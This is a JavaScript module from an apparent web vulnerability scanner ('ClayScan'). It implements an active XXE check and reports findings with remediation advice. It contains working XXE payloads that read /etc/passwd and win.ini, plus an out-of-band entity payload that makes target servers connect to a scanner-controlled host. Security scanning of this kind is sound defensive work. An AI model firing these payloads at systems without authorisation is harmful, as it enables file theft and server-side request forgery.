import { send } from '../http/insertion.js';
import { startCollector } from '../http/oob.js';

const FILE_SIG = [
  { re: /root:.*?:0:0:/, what: '/etc/passwd contents' },
  { re: /\[fonts\]|\[extensions\]|for 16-bit app support/i, what: 'Windows win.ini contents' },
];

const filePayload = (uri) =>
  `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE clayscan [<!ENTITY xxe SYSTEM "${uri}">]><clayscan>&xxe;</clayscan>`;
const oobPayload = (uri) =>
  `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE clayscan [<!ENTITY xxe SYSTEM "${uri}">]><clayscan>&xxe;</clayscan>`;

export default {
  id: 'xxe',
  name: 'XML external entity (XXE) injection',
  phase: 'active',
  intrusive: 'high',
  async run({ site, findings, http, target, opts }) {
    const candidates = collectCandidates(site, target, opts);
    if (!candidates.length) return;

    let collector;
    try { collector = await startCollector(target, opts); } catch { collector = null; }

    const oobInjected = [];
    try {
      for (const c of candidates) {
        const headers = { ...(c.headers || {}), 'content-type': 'application/xml' };

        for (const uri of ['file:///etc/passwd', 'file:///c:/windows/win.ini']) {
          const res = await send(http, { method: c.method, url: c.url, headers, body: filePayload(uri) });
          if (!res.ok || !res.body) continue;
          const sig = FILE_SIG.find((s) => s.re.test(res.body));
          if (sig) {
            findings.add({
              id: 'xxe-file-read',
              title: `XXE file disclosure at ${new URL(c.url).pathname}`,
              severity: 'critical',
              url: c.url,
              evidence: `An XML external entity referencing ${uri} was resolved and reflected: response contained ${sig.what}.`,
              impact:
                'The XML parser resolves external entities, allowing arbitrary local file reads, SSRF, and sometimes denial of service or RCE.',
              remediation:
                'Disable DOCTYPE/external entity processing in the XML parser (set FEATURE_SECURE_PROCESSING / disallow-doctype-decl).',
              cwe: 'CWE-611',
              poc: `POST an XML document with <!ENTITY xxe SYSTEM "${uri}"> to ${c.url}.`,
              references: ['https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing'],
              confidence: 0.9,
            });
            return;
          }
        }

        if (collector) {
          const token = collector.token();
          await send(http, { method: c.method, url: c.url, headers, body: oobPayload(collector.url(token)) });
          oobInjected.push({ url: c.url, token });
        }
      }

      if (collector && oobInjected.length) {
        await collector.wait(opts.oobWaitMs ?? 5000);
        for (const inj of oobInjected) {
          if (collector.hit(inj.token)) {
            findings.add({
              id: 'xxe-oob',
              title: `Blind XXE at ${new URL(inj.url).pathname}`,
              severity: 'high',
              url: inj.url,
              evidence: 'An XML external entity pointing at a ClayScan-controlled URL was resolved by the server (out-of-band callback received).',
              impact:
                'The XML parser resolves external entities even without reflecting them, enabling blind file exfiltration and SSRF.',
              remediation:
                'Disable external entity and DTD processing in the XML parser.',
              cwe: 'CWE-611',
              poc: `POST an XML document with an external entity to ${inj.url}; the server connects out.`,
              confidence: 0.9,
            });
          }
        }
      }
    } finally {
      if (collector) await collector.close().catch(() => {});
    }
  },
};

function collectCandidates(site, target, opts) {
  const out = [];
  const seen = new Set();
  const add = (method, url, headers) => {
    const key = method + ' ' + url.split('?')[0];
    if (seen.has(key)) return;
    seen.add(key);
    out.push({ method, url, headers });
  };

  for (const r of site.requests || []) {
    const ct = (r.headers && (r.headers['content-type'] || r.headers['Content-Type'])) || '';
    if (/xml/i.test(ct) || /^\s*<\?xml|^\s*<[a-z]/i.test(r.postData || '')) {
      add(r.method || 'POST', r.url, r.headers);
    }
  }

  const origin = new URL(target).origin;
  const urls = new Set([...(site.endpoints || [])]);
  let extra = 0;
  for (const u of urls) {
    if (extra >= (opts.maxXxeTargets ?? 12)) break;
    try {
      const p = new URL(u);
      if (p.origin !== origin) continue;
      if (/\.(?:js|css|png|jpe?g|gif|svg|ico|woff2?|map)$/i.test(p.pathname)) continue;
      add('POST', p.origin + p.pathname, {});
      extra++;
    } catch {  }
  }
  return out;
}
